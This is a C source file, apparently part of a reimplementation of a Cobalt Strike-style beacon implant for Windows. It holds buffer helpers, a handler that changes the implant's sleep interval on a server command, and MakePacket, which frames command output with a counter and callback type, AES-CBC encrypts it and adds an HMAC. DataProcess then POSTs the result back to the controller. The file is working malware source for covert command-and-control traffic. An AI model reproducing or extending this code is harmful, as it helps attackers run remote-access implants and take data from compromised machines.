#define _TIMESPEC_DEFINED  // 防止 windows.h 重复定义 timespec
#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include "Command.h"
#include "Http.h"
#pragma warning(disable:4996)

extern int SleepTime;
extern int Counter;
extern unsigned char AESRandaeskey[16];
extern int clientID;

struct Buffer {
    unsigned char* data;
    size_t capacity;
    size_t length;
};

void buffer_init(struct Buffer* buf) {
    buf->data = malloc(1);  // 初始容量为1
    if (buf->data == NULL) {
        fprintf(stderr, "Memory alloocation failed\n");
        exit(EXIT_FAILURE);
    }
    buf->data[0] = '\0';
    buf->capacity = 1;
    buf->length = 0;
}

void buffer_append(struct Buffer* buf, unsigned char* str, size_t buflen) {
    size_t len = buflen;
    if (buf->data == NULL) {
        buf->data = (unsigned char*)malloc(len);
        if (buf->data == NULL) {
            fprintf(stderr, "Memory allocation failed\n");
            exit(EXIT_FAILURE);
        }
        buf->capacity = len;
        buf->length = len;
        memcpy(buf->data, str, len);
    }
    else {
        size_t required_capacity = buf->length + len;
        if (required_capacity > buf->capacity) {
            buf->capacity = required_capacity;
            unsigned char* new_data = (unsigned char*)realloc(buf->data, buf->capacity);
            if (new_data == NULL) {
                fprintf(stderr, "Memory allocation failed\n");
                exit(EXIT_FAILURE);
            }
            buf->data = new_data;
        }
        memcpy(buf->data + buf->length, str, len);
        buf->length += len;
    }
}

void buffer_free(struct Buffer* buf) {
    free(buf->data);
    buf->data = NULL;
    buf->capacity = 0;
    buf->length = 0;
}

void CmdChangSleepTimes(unsigned char* CommandBuf) {
    uint8_t buf[4];
    memcpy(buf, CommandBuf, 4);
    uint32_t sleep = bigEndianUint32(buf);
    SleepTime = sleep;
}

unsigned char* MakePacket(int callback, unsigned char* buff, size_t lenn, size_t* buflen) {

    Counter += 1;

    struct Buffer buf;
    buffer_init(&buf);
    
    uint8_t counterBytes[4];
    PutUint32BigEndian(counterBytes, (uint32_t)Counter);
    buffer_append(&buf, counterBytes, 4);

    if (buff != NULL) {
        uint8_t resultLenBytes[4];
        int resultLen = (int)lenn + 4;
        PutUint32BigEndian(resultLenBytes, (uint32_t)resultLen);

        buffer_append(&buf, resultLenBytes, 4);
    }
    uint8_t replyTypeBytes[4];
    PutUint32BigEndian(replyTypeBytes, (uint32_t)callback);
    buffer_append(&buf, replyTypeBytes, 4);
    buffer_append(&buf, buff, lenn);

    size_t decryptAES_CBCdatalen;

    // AES CBC 加密
    unsigned char* EncryptAES_CBCdata = AesCBCEncrypt(buf.data, AESRandaeskey, buf.length, &decryptAES_CBCdatalen);

    EncryptAES_CBCdata[decryptAES_CBCdatalen] = '\0';
    unsigned char* encrypted;
    encrypted = EncryptAES_CBCdata + 16; // 存放HMAC Hash

    buffer_free(&buf);

    int sendLength = decryptAES_CBCdatalen;
    uint8_t sendLenBytes[4];
    PutUint32BigEndian(sendLenBytes, (uint32_t)sendLength);

    buffer_init(&buf);
    buffer_append(&buf, sendLenBytes, 4);
    buffer_append(&buf, encrypted, decryptAES_CBCdatalen-16);
    size_t encryptedBytesLen = decryptAES_CBCdatalen - 16;

    unsigned char* hmacResult = HMkey(encrypted, encryptedBytesLen);
    
    buffer_append(&buf, hmacResult, 16);
    *buflen = buf.length;

    free(hmacResult);
    free(EncryptAES_CBCdata);

    return buf.data;
}

VOID DataProcess(unsigned char* buf, size_t len, int callback) {
    buf[len] = '\0';
    // callback 为 0 表示会输出东西
    if (callback == 0) {
        size_t outputLen;
        unsigned char* utf8Buf = CodepageToUTF8(buf, len, &outputLen);
        if (utf8Buf != NULL) {

        }
    }

    POST(buf, len, callback);
}